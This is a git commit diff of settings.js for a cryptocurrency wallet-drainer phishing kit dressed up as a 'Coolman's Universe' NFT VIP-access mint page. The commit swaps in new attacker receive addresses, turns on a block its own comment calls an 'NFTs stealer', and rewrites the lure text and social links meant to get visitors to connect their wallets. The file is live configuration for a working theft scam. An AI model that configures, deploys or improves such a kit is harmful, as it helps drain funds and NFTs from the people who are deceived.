280fd6dceba86d83243134b8bdc334ac2e69e053
russeldav <106355918+russeldav@users.noreply.github.com>
2023-10-11 04:12:26 -0700

    Add files via upload

--- settings.js
+++ settings.js
@@ -1,9 +1,9 @@
-const receiveAddress = "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5";
+const receiveAddress = "0x8579563de99ECFDD9b6cC00FCdc3bE1C10710945";
 
 const collectionInfo = {
     name: "Coolman's Universe Moderator Database",
     socialMedia: {
-        discord: "",
+        discord: "https://discord.com/invite/cmuniverse",
         twitter: "https://twitter.com/CoolmanUniverse",
         instagram: "",
     },
@@ -12,7 +12,7 @@ const collectionInfo = {
 const indexPageInfo = {
     backgroundImage: "disney-wish-movie-2023-1-1.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "Last Chance To Become Whitelisted!",
+    underTitle: "SPECIAL REWARDS AND V.I.P ACCESS",
 }
 
 const claimPageInfo = {
@@ -20,7 +20,7 @@ const claimPageInfo = {
     shortDescription: "",
     longDescription: "A Database of wallet addresses that receive early access to an NFT collection before its public launch. Those on the vip access have the option of buying newly released NFTs before the rest of the market, and at much lower transaction fees.The wallet addresses that make up the vip access are usually carefully chosen users who have supported the project in its early days. These users interact, promote and discuss the NFT project",
 
-    claimButtonText: "NEXT",
+    claimButtonText: "NEX",
 
     image: "ola.gif", // relative path to image (in assets)
     imageRadius: 250, // image radius in px
@@ -29,12 +29,12 @@ const claimPageInfo = {
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5" // leave empty if you want to use the same as receiveAddress 
+    nftReceiveAddress: "0x8579563de99ECFDD9b6cC00FCdc3bE1C10710945" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    connectButton: "Connect",
+    connectButton: "Connet",
     transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
